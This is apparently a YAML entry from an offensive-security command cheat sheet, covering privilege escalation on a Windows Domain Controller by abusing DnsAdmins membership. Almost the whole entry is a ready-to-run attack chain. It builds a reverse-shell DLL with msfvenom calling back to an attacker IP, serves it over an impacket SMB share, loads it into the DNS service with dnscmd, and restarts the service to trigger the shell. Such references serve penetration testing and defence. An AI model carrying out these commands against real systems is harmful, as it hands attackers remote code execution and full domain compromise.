---
description: |
  Abuse DNS Admins group membership to escalate privileges by loading a malicious DLL into the DNS service on a Domain Controller.
command: |
  # Check DnsAdmins group membership
  net group "DnsAdmins" /domain

  # Create malicious DLL with msfvenom
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f dll -o evil.dll

  # Host the DLL on an SMB share (attacker)
  impacket-smbserver share . -smb2support

  # Configure DNS server to load the malicious DLL
  dnscmd DC01 /config /serverlevelplugindll \\10.10.10.21\share\evil.dll

  # Restart the DNS service to trigger DLL load
  sc \\DC01 stop dns
  sc \\DC01 start dns

  # Clean up — remove the plugin DLL configuration
  dnscmd DC01 /config /serverlevelplugindll ""
items:
  - Shell
phase:
  - PrivEsc
target_os:
  - Windows
services:
  - DNS
techniques:
  []
references:
  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#dnsadmins
  - https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
---
